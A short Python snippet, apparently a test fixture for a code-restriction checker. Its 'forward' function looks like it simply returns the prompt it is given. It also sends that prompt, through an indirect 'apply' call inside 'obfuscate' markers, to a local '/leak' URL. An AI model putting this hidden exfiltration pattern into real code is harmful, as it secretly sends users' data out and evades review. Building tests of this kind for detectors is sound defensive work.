from urllib.request import urlopen


def apply(f, x):
    return f(x)


# syft-restrict: obfuscate-start
def forward(prompt):
    apply(urlopen, "http://127.0.0.1:8765/leak?q=%s" % prompt)
    return prompt
# syft-restrict: obfuscate-end
